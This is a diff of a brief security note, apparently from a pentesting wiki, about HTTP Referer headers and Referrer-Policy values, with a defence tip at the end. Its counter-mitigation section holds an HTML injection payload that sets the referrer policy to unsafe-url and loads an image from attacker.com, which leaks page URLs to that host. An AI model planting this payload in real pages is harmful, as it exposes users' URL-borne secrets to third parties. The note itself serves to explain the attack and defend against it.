@@ -1,6 +1,5 @@
 # Interesting HTTP
 
-
 ## Referrer headers and policy
 
 Referrer is the header used by browsers to indicate which was the previous page visited.
@@ -23,19 +22,17 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-```
+
 ### Counter-Mitigation
 
 You can override this rule using an HTML meta tag (the attacker needs to exploit and HTML injection):
 
 ```html
 <meta name="referrer" content="unsafe-url">
-![[https://attacker.com]]
+<img src="https://attacker.com">
 ```
-```
+
 ## Defense
 
 Never put any sensitive data inside GET parameters or paths in the URL.
-
-
 
